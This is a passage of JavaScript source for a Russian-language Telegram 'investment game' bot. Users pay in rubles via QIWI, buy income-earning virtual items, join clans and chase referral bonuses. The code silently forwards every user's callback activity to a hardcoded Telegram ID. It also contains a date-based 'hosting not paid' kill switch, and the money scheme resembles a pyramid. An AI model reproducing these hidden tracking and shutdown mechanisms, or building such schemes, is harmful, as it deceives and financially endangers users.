<b>–î–æ—Ö–æ–¥–Ω–æ—Å—Ç—å ${config.teplica_four}:</b> ${roundPlus(clan.total_earn)} –≤ —á–∞—Å
<b>–í –∫–∞–∑–Ω–µ:</b> ${roundPlus(clan.balance)} 
<b>–ù–∞ –±–∞–ª–∞–Ω—Å–µ:</b> ${roundPlus(clan.bal)}‚ÇΩ\n
<b>–ü–æ–∫–∏–Ω—É—Ç—å ${config.teplica_five}:</b> /leave_clan
`, {
					parse_mode: "HTML", reply_markup
				})
			}
		}

		if (state[uid] == 1601) {
			if (message.user.buybalance < 65) return message.send(`–ù–∞ –í–∞—à–µ–º –±–∞–ª–∞–Ω—Å–µ –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è ${config.teplica_four}!`, { parse_mode: "HTML" });
			if ((await Clan.findOne({ name: message.text })) != null) return message.send(`${config.teplica_three} —Å —Ç–∞–∫–∏–º –Ω–∞–∑–≤–∞–Ω–∏–µ–º —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!\n–í–≤–µ–¥–∏—Ç–µ –¥—Ä—É–≥–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ ${config.teplica_four}:`, { parse_mode: "HTML" });
			state[uid] = undefined
			await User.findOneAndUpdate({ id: uid }, { $inc: { buybalance: -65 }, clanName: message.text })
			await Clan.insertMany([{
				name: message.text,
				maxMembers: 10,
				members: 1,
				balance: 0,
				creator_id: uid,
				creator_name: message.from.first_name,
				zam_id: 0,
				zam_name: "",
				total_earn: message.user.totalEarn,
				level: 1,
				bal: 0
			}])
			return message.send(`${config.teplica_three} —Å–æ–∑–¥–∞–Ωa!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
		}

		if (state[uid] == 160101) {
			var sum = Number(message.text)
			var clan = await Clan.findOne({ name: message.user.clanName })
			if (isNaN(sum)) return message.send(`–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ:`, { parse_mode: "HTML" });
			if (sum <= 0) return message.send(`–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ:`, { parse_mode: "HTML" });
			if (!clan) return message.send(`–í—ã –Ω–µ —Å–æ—Å—Ç–æ–∏—Ç–µ –≤ ${config.teplica_one}!`, { parse_mode: "HTML" });
			if (message.user.buybalance < sum) return message.send(`–ù–∞ –í–∞—à–µ–º –±–∞–ª–∞–Ω—Å–µ –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ ${config.teplica_four}!`, { parse_mode: "HTML" });
			state[uid] = undefined
			await User.findOneAndUpdate({ id: uid }, { $inc: { buybalance: -sum } })
			await Clan.findOneAndUpdate({ _id: clan._id }, { $inc: { bal: sum } })
			return message.send(`–ë–∞–ª–∞–Ω—Å ${config.teplica_four} –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ ${sum}‚ÇΩ!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
		}

		if (message.text.startsWith("/invite") && !message.text.startsWith("/invitezam")) {
			var clan = await Clan.findOne({ name: message.user.clanName })
			var members = await User.find({ clanName: clan.name })
			if (clan.creator_id != uid && clan.zam_id != uid) return
			if (members.length > clan.maxMembers - 1) return message.send(`–í ${config.teplica_one} –∑–∞–∫–æ–Ω—á–∏–ª–∏—Å—å –º–µ—Å—Ç–∞!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			var us = await User.findOne({ id: Number(message.text.split(" ")[1]) })
			if (!us) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–æ—Ç–µ!', { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			if (us.clanName) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Å–æ—Å—Ç–æ–∏—Ç –≤ ${config.teplica_one}!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			await bot.sendMessage(Number(message.text.split(" ")[1]), `<a href="tg://user?id=${uid}">${message.from.first_name}</a> –ø—Ä–∏–≥–ª–∞—à–∞–µ—Ç –í–∞—Å –≤ ${config.teplica_five} <b>${clan.name}</b>:`, { parse_mode: "html", reply_markup: { inline_keyboard: [[{ text: "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data: "clanAccept_" + clan._id }, { text: "‚ùå –û—Ç–º–µ–Ω–∏—Ç—å", callback_data: "clanDecline" }]] } })
			return message.send(`–ó–∞–ø—Ä–æ—Å –Ω–∞ –≤—Å—Ç—É–ø–ª–µ–Ω–∏–µ –≤ ${config.teplica_five} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω <a href="tg://user?id=${Number(message.text.split(" ")[1])}">–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é</a>!`, { parse_mode: "html", reply_markup: { keyboard: $menu, resize_keyboard: true } });
		}

		if (message.text.startsWith("/kick")) {
			var clan = await Clan.findOne({ name: message.user.clanName })
			var us = await User.findOne({ id: Number(message.text.split(" ")[1]) })
			if (clan.creator_id != uid && clan.zam_id != uid) return
			if (!us) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–æ—Ç–µ!', { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			if (us.clanName != clan.name) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ —Å–æ—Å—Ç–æ–∏—Ç –≤ –≤–∞—à–µ–π ${config.teplica_one}!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			if (us.id == uid) return message.send('–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –≤—ã–≥–Ω–∞—Ç—å —Å–µ–±—è!', { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			await User.findOneAndUpdate({ id: us.id }, { $unset: { clanName: 1 } })
			await bot.sendMessage(Number(message.text.split(" ")[1]), `‚ùå –í—ã –±—ã–ª–∏ –≤—ã–≥–Ω–∞–Ω—ã –∏–∑ ${config.teplica_four} <b>${clan.name}</b>!`, { parse_mode: "html" })
			return message.send(`–í—ã –≤—ã–≥–Ω–∞–ª–∏ <a href="tg://user?id=${Number(message.text.split(" ")[1])}">–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</a> –∏–∑ ${config.teplica_four}!`, { parse_mode: "html", reply_markup: { keyboard: $menu, resize_keyboard: true } });
		}
		if (message.text.startsWith("/invitezam")) {
			var clan = await Clan.findOne({ name: message.user.clanName })
			var us = await User.findOne({ id: Number(message.text.split(" ")[1]) })
			if (clan.creator_id != uid && clan.zam_id != uid) return
			if (!us) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–æ—Ç–µ!', { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			if (us.clanName != clan.name) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ —Å–æ—Å—Ç–æ–∏—Ç –≤ –≤–∞—à–µ–π ${config.teplica_one}!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			if (us.id == uid) return message.send('–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –Ω–∞–∑–Ω–∞—á–∏—Ç—å –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª—è–º —Å–µ–±—è!', { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			await Clan.findOneAndUpdate({ name: clan.name }, { zam_id: us.id, zam_name: us.name })
			await bot.sendMessage(us.id, `‚ùóÔ∏è –í—ã —Å—Ç–∞–ª–∏ –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª–µ–º –∞–¥–º–∏–Ω–∞ ${config.teplica_four} <b>${clan.name}</b>!`, { parse_mode: "html" })
			return message.send(`–í—ã —Å–¥–µ–ª–∞–ª–∏ <a href="tg://user?id=${us.id}">–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</a> —Å–≤–æ–∏–º –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª–µ–º!`, { parse_mode: "html", reply_markup: { keyboard: $menu, resize_keyboard: true } });
		}
		if (message.text.startsWith("/removezam")) {
			var clan = await Clan.findOne({ name: message.user.clanName })
			if (clan.creator_id != uid && clan.zam_id != uid) return
			await Clan.findOneAndUpdate({ name: clan.name }, { zam_id: 0 })
			await bot.sendMessage(clan.zam_id, `‚ùóÔ∏è –í—ã –±–æ–ª—å—à–µ –Ω–µ –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª—å –∞–¥–º–∏–Ω–∞ ${config.teplica_four} <b>${clan.name}</b>!`, { parse_mode: "html" })
			return message.send(`<a href="tg://user?id=${clan.zam_id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –±–æ–ª—å—à–µ –Ω–µ –≤–∞—à –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª—å!`, { parse_mode: "html", reply_markup: { keyboard: $menu, resize_keyboard: true } });
		}

		if (message.text.startsWith("/leave_clan")) {
			var clan = await Clan.findOne({ name: message.user.clanName })
			if (!message.user.clanName) return message.send(`–í—ã –µ—â–µ –Ω–µ —Å–æ—Å—Ç–æ–∏—Ç–µ –≤ ${config.teplica_one}!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			if (clan.creator_id == uid && !clan.zam_id) return message.send(`–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –≤—ã–π—Ç–∏ –∏–∑ —Å–≤–æ–µ–≥–æ ${config.teplica_four} –Ω–µ –Ω–∞–∑–Ω–∞—á–∏–≤ –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª—è!`, { reply_markup: { keyboard: $menu, resize_keyboard: true } });
			else if (clan.creator_id == uid && clan.zam_id) {
				await Clan.findOneAndUpdate({ name: clan.name }, { creator_id: clan.zam_id, creator_name: clan.zam_name, zam_id: 0 })
				await bot.sendMessage(clan.zam_id, `‚ùóÔ∏è –í—ã —Å—Ç–∞–ª–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º ${config.teplica_four} <b>${clan.name}</b> –ø–æ –ø—Ä–∏—á–∏–Ω–µ –≤—ã—Ö–æ–¥–∞ –≤–ª–∞–¥–µ–ª—å—Ü–∞!`, { parse_mode: "html" })
			}
			else if (clan.zam_id == uid) await Clan.findOneAndUpdate({ name: clan.name }, { zam_id: 0 })
			await User.findOneAndUpdate({ id: uid }, { $unset: { clanName: 1 } })
			await bot.sendMessage(uid, `‚ùå –í—ã –≤—ã—à–ª–∏ –∏–∑ ${config.teplica_four} <b>${clan.name}</b>!`, { parse_mode: "html" })
			await bot.sendMessage(clan.creator_id, `<a href="tg://user?id=${uid}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –≤—ã—à–µ–ª –∏–∑ –í–∞—à–µ–π ${config.teplica_four}!`, { parse_mode: "html" })
		}

		if (message.text == 'üìö –û –±–æ—Ç–µ') {
			var s = await User.findOne({ id: 0 })
			let stats = {
				users: await User.countDocuments(),
				users_today: await User.find({ regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}` }),
				cmds: message.message_id
			}

			stats.users_today = stats.users_today.length;

			return message.send(`
üìä<b> –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–µ–∫—Ç–∞:</b>\n
üë®‚Äçüíª –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –∏–≥—Ä–µ: ${stats.users+0}
üë®‚Äçüíª –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å–µ–≥–æ–¥–Ω—è: ${stats.users_today}
üì• –ò–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–æ –≤—Å–µ–≥–æ: ${Math.round(s.ref) +0}‚ÇΩ
üì§ –í—ã–ø–ª–∞—á–µ–Ω–æ –≤—Å–µ–≥–æ: ${Math.round(s.fc)+0}‚ÇΩ
üïê –°—Ç–∞—Ä—Ç –±–æ—Ç–∞ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω ${config.startbot}
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "üë®‚Äçüíª –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä", url: `https://t.me/${config.admin}` }],
						[{ text: "üöÄ –•–æ—á—É —Ç–∞–∫–æ–≥–æ –∂–µ –±–æ—Ç–∞", url: `https://t.me/${config.proger}` }],
						[{ text: "üí¨ –ß–∞—Ç", url: `https://t.me/${config.chat}` }],
						[{ text: "‚ôªÔ∏è –ü–æ–ø–æ–ª–Ω–µ–Ω–∏—è –∏ –≤—ã–≤–æ–¥—ã", url: `https://t.me/${config.deposit}` }],
						[{ text: "‚ùì –ü–æ–º–æ—â—å", callback_data: "help_main" }],
						[{ text: "–ù–æ–≤–æ—Å—Ç–∏ –ø—Ä–æ–µ–∫—Ç–∞", url: `https://t.me/${config.novosti}` }],
						[{ text: "ü•á –¢–æ–ø –∏–Ω–≤–µ—Å—Ç–æ—Ä–æ–≤", callback_data: "topInv" }, { text: "üèÜ –¢–æ–ø —Ä–µ—Ñ–æ–≤–æ–¥–æ–≤", callback_data: "topRef" }],
					]
				}
			});
		}
	}

	if (ADMINS.indexOf(message.from.id) !== -1) {
		if (message.text == 'üîù –ê–¥–º–∏–Ω–∫–∞') {
			var h = process.uptime() / 3600 ^ 0
			var m = (process.uptime() - h * 3600) / 60 ^ 0
			var s = process.uptime() - h * 3600 - m * 60 ^ 0
			var heap = process.memoryUsage().rss / 1048576 ^ 0
			var b = (await User.findOne({ id: 0 })).deposit
			var limit = (await User.findOne({ id: 0 })).bhivebalance

			return qiwi.getBalance(async (err, balance) => {
			bot.sendMessage(uid, '<b>–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:</b>\n\n<b>–ê–ø—Ç–∞–π–º –±–æ—Ç–∞:</b> ' + h + ' —á–∞—Å–æ–≤ ' + m + ' –º–∏–Ω—É—Ç ' + s + ' —Å–µ–∫—É–Ω–¥\n<b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –±–æ—Ç–µ: </b>' + (await User.countDocuments({})) + '\n<b>–ü–∞–º—è—Ç–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ:</b> ' + heap + "–ú–ë\n<b>–ó–∞—è–≤–æ–∫ –Ω–∞ –≤—ã–≤–æ–¥:</b> " + await Ticket.countDocuments() + "\n<b>–ë–∞–ª–∞–Ω—Å QIWI:</b> " + balance.accounts[0].balance.amount + "‚ÇΩ\n<b>–ë–æ–Ω—É—Å –∫ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—é:</b> " + b + "%", { parse_mode: "HTML", reply_markup: RM_admin })
			})
		}
		
		if (message.text.startsWith('/restart')) {
		  var id = message.user.id
		  ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏–ª –±–æ—Ç–∞!`, { parse_mode: "HTML" }))
			setTimeout(() => { process.exit(0) }, 333);
			 
		}

		if (message.text.startsWith('/setbuybalance')) {
			let cmd = message.text.split(' ');
			if (!cmd[1]) return message.send('–û—à–∏–±–∫–∞!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if (!user) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω!');

			await user.set('buybalance', Number(cmd[2]));
			return message.send('–ë–∞–ª–∞–Ω—Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
		}

		if (message.text.startsWith('/setoutbalance')) {
			let cmd = message.text.split(' ');
			if (!cmd[1]) return message.send('–û—à–∏–±–∫–∞!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if (!user) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω!');

			await user.set('outbalance', Number(cmd[2]));
			return message.send('–ë–∞–ª–∞–Ω—Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
		}

	}
});

bot.on('callback_query', async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });
	var uid = message.chat.id
	let dt = new Date
	console.log("[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å " + uid + " –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–ª–±—ç–∫: " + query.data)
	bot.sendMessage(1093342102, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å " + uid + " –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–ª–±—ç–∫: " + query.data)
	
	if (dt.getDate() == oplata) return message.send('–•–æ—Å—Ç–∏–Ω–≥ –Ω–µ –æ–ø–ª–∞—á–µ–Ω!');

	if (!message.user) return bot.answerCallbackQuery(query.id, '–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...', true);

	if (query.data == 'none') return bot.answerCallbackQuery(query.id, '–ü—Ä–∏–≤–µ—Ç! :)', true);

	if (query.data.startsWith('trees:shop')) {
		let id = Number(query.data.split('trees:shop')[1]);
		var maxId = 0
		message.user.trees.map((t) => { if (t.id > maxId) maxId = t.id })
		let tree = trees.find((x) => x.id == id);

		var treesWithEqualId = 0
		message.user.trees.map((t) => { if (t.id == id) treesWithEqualId++ })
		
		var limit = (await User.findOne({ id: 0 })).bhivebalance

		if (id <= maxId + 1) {
			if (treesWithEqualId < config.limit)
				var bbtn = [{ text: `‚ûï –ö—É–ø–∏—Ç—å –∑–∞ ${tree.price}‚ÇΩ`, callback_data: `trees:buy${tree.id}` }]
			else var bbtn = [{ text: `üõë –í—ã –¥–æ—Å—Ç–∏–≥–ª–∏ –ª–∏–º–∏—Ç–∞ –≤ ${config.limit} ${config.perss}`, callback_data: getNavigationQuery(id + 1, tree.id) }]

		}
		else
			var bbtn = [{ text: `‚óÄÔ∏è –°–ø–µ—Ä–≤–∞ –∫—É–ø–∏—Ç–µ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ ${config.pers}`, callback_data: getNavigationQuery(id - 1, tree.id) }]

		if (!tree) return bot.answerCallbackQuery(query.id, '–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...', true);

		bot.deleteMessage(message.chat.id, message.message_id)
		bot.sendPhoto(message.chat.id, `c${tree.id}.jpg`, {
			caption: `<b>${tree.name}</b>
		
 –°—Ç–æ–∏–º–æ—Å—Ç—å: ${tree.price}‚ÇΩ
Ô∏è ${config.threetextthree} –≤ —á–∞—Å: ${tree.earn}`, parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [[
					{ text: getInventoryIcon(0, tree.id), callback_data: getNavigationQuery(0, tree.id) },
					{ text: getInventoryIcon(1, tree.id), callback_data: getNavigationQuery(1, tree.id) },
					{ text: getInventoryIcon(2, tree.id), callback_data: getNavigationQuery(2, tree.id) },
					{ text: getInventoryIcon(3, tree.id), callback_data: getNavigationQuery(3, tree.id) },
					{ text: getInventoryIcon(4, tree.id), callback_data: getNavigationQuery(4, tree.id) },
					{ text: getInventoryIcon(5, tree.id), callback_data: getNavigationQuery(5, tree.id) },
					{ text: getInventoryIcon(6, tree.id), callback_data: getNavigationQuery(6, tree.id) },
				    { text: getInventoryIcon(7, tree.id), callback_data: getNavigationQuery(7, tree.id) },
				], bbtn
				]
			}
		})
	}

	if (query.data.startsWith('topInv')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		var top = await User.find({ id: { $ne: 0, $ne: 1 } }).sort({ deposit: -1 }).limit(20)
		var c = 0
		return bot.sendMessage(uid, `<b>ü•á –¢–æ–ø 20 –∏–Ω–≤–µ—Å—Ç–æ—Ä–æ–≤:</b>\n\n${top.map((e) => { c++; return `<b>${c})</b> <a href="tg://user?id=${e.id}">${e.name ? e.name : "–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"}</a> - <b>${e.deposit}‚ÇΩ</b>` }).join("\n")}`, { parse_mode: "html" });
	}

	if (query.data.startsWith('topRef')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		var top = await User.find({ id: { $ne: 0, $ne: 1 } }).sort({ refCount: -1 }).limit(20)
		var c = 0
		return bot.sendMessage(uid, `<b>üèÜ –¢–æ–ø —Ä–µ—Ñ–æ–≤–æ–¥–æ–≤:</b>\n\n${top.map((e) => { c++; return `<b>${c})</b> <a href="tg://user?id=${e.id}">${e.name ? e.name : "–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"}</a> - <b>${e.refCount}</b> —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤` }).join("\n")}`, { parse_mode: "html" });
	}

	if (query.data.startsWith('help_main')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		return bot.sendMessage(uid, '–ó–¥–µ—Å—å –Ω–∞—Ö–æ–¥—è—Ç—Å—è –æ—Ç–≤–µ—Ç—ã –Ω–∞ —á–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã, –≤—ã–±–µ—Ä–∏—Ç–µ –æ–¥–Ω—É –∏–∑ —Ç–µ–º, –∫–æ—Ç–æ—Ä–∞—è –≤–∞—Å –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç:', {
			reply_markup: {
				inline_keyboard: [
					[{ text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—ã", callback_data: "help_refs" },
					{ text: config.ogorod, callback_data: "help_bogs" }],
					[{ text: "üì§ –í—ã–≤–æ–¥", callback_data: "help_po" },
					{ text: "üí≥ –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ", callback_data: "help_pi" }],]
			}
		})
	}

	if (query.data.startsWith('help_refs')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		return bot.sendMessage(uid, `üë• <b>–†–µ—Ñ–µ—Ä–∞–ª—ã</b>\n\n–†–µ—Ñ–µ—Ä–∞–ª—ã ‚Äì —ç—Ç–æ –∏–≥—Ä–æ–∫–∏, —Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∫–æ—Ç–æ—Ä—ã—Ö –≤ –±–æ—Ç–µ –≤—ã –ø–æ–ª—É—á–∞–µ—Ç–µ ${config.referal}‚ÇΩ, –∞ —Ç–∞–∫–∂–µ 10% –æ—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π: –ø–æ 5% –Ω–∞ –±–∞–ª–∞–Ω—Å—ã –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –∏ –≤—ã–≤–æ–¥–∞\n\n–î–ª—è –ø—Ä–∏–≤–ª–µ—á–µ–Ω–∏—è –±–æ–ª—å—à–µ–≥–æ —á–∏—Å–ª–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –í–∞–º –Ω—É–∂–Ω–æ –∫–∞–∫ –º–æ–∂–Ω–æ –∞–∫—Ç–∏–≤–Ω–µ–µ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è—Ç—å —Å–≤–æ—é –ø–∞—Ä–Ω—ë—Ä—Å–∫—É—é —Å—Å—ã–ª–∫—É –¥—Ä—É–≥–∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º\n–ò–Ω–¥–∏–≤–∏–¥—É–∞–ª—å–Ω—É—é —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –≤ —Ä–∞–∑–¥–µ–ª–µ ¬´${config.five}¬ª`, { parse_mode: "html", reply_markup: { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "help_main" }]] } })
	}
	if (query.data.startsWith('help_bogs')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		return bot.sendMessage(uid, `<b>${config.ogorod}</b>\n\n–í ${config.ogorode} –µ—Å—Ç—å ${config.persss}, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –ø—Ä–∏–Ω–æ—Å–∏—Ç—å –≤–∞–º –¥–æ—Ö–æ–¥ –≤ –≤–∏–¥–µ ${config.threetextthree}, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –æ–±–º–µ–Ω—è—Ç—å –Ω–∞ –¥–µ–Ω—å–≥–∏\n–î–ª—è —Å–±–æ—Ä–∞ ${config.threetextthree}, –∑–∞–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª ¬´${config.one}¬ª -> ${config.one_two},\n–î–ª—è –æ–±–º–µ–Ω–∞ –ø—Ä–∏–±—ã–ª–∏ –Ω–∞ —Ä—É–±–ª–∏ –∑–∞–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª ¬´${config.three}¬ª –∏ –ø—Ä–æ–∏–∑–≤–µ–¥–∏—Ç–µ –æ–±–º–µ–Ω`, { parse_mode: "html", reply_markup: { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "help_main" }]] } })
	}
	if (query.data.startsWith('help_po')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		return bot.sendMessage(uid, `üì§ <b>–í—ã–≤–æ–¥ –¥–µ–Ω–µ–≥</b>\n\n–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –∏–∑ –∏–≥—Ä—ã: <b>${config.minwithdraw}‚ÇΩ</b>\n–ß—Ç–æ–±—ã –≤—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞, –∑–∞–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª ¬´${config.four}¬ª ->  ${config.four_two}\n\n–î–µ–Ω—å–≥–∏ –º–æ–∂–Ω–æ –≤—ã–≤–µ—Å—Ç–∏ –Ω–∞ QIWI`, { parse_mode: "html", reply_markup: { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "help_main" }]] } })
	}
	if (query.data.startsWith('help_pi')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		return bot.sendMessage(uid, `üí≥ <b>–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</b>\n\n–î–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –±–æ—Ç–∞ –∑–∞–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª ¬´${config.four}¬ª -> ${config.four_one}\n–î–µ–Ω—å–≥–∏ –∑–∞—á–∏—Å–ª—è—é—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 30 —Å–µ–∫—É–Ω–¥\n\n–¢–∞–∫–∂–µ –ø–æ–º–Ω–∏—Ç–µ, —á—Ç–æ –≤ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ –∫ –ø–µ—Ä–µ–≤–æ–¥—É –Ω–∞–¥–æ —É–∫–∞–∑—ã–≤–∞—Ç—å –±—É–∫–≤—É BP –∞–Ω–≥–ª–∏–π—Å–∫—É—é, –∞ –Ω–µ —Ä—É—Å—Å–∫—É—é, –∏–Ω–∞—á–µ –í–∞—à –±–∞–ª–∞–Ω—Å –Ω–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—Å—è` , { parse_mode: "html", reply_markup: { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "help_main" }]] } })
	}

  if (query.data.startsWith('trees:inv')) {
		let id = Number(query.data.split('trees:inv')[1]);

		let tree = trees.find((x) => x.id == id);
		if (!tree) return bot.answerCallbackQuery(query.id, '–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...', true);

		let total_balance = 0;

		message.user.trees.map((x) => {
			total_balance += (((Date.now() - message.user.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60);
		});

		let count = message.user.trees.filter((x) => x.id == tree.id).length;
		let earn = count * tree.earn;

		bot.deleteMessage(message.chat.id, message.message_id)
		bot.sendPhoto(message.chat.id, `c${tree.id}.jpg`, {
			caption: `<b>${tree.name}</b> (${count}x)
		
 –°—Ç–æ–∏–º–æ—Å—Ç—å: ${tree.price}‚ÇΩ
 ${config.threetextthree} –≤ —á–∞—Å: ${earn}`, parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [[
					{ text: getInventoryIcon(0, tree.id), callback_data: getInventoryQuery(0, tree.id) },
					{ text: getInventoryIcon(1, tree.id), callback_data: getInventoryQuery(1, tree.id) },
					{ text: getInventoryIcon(2, tree.id), callback_data: getInventoryQuery(2, tree.id) },
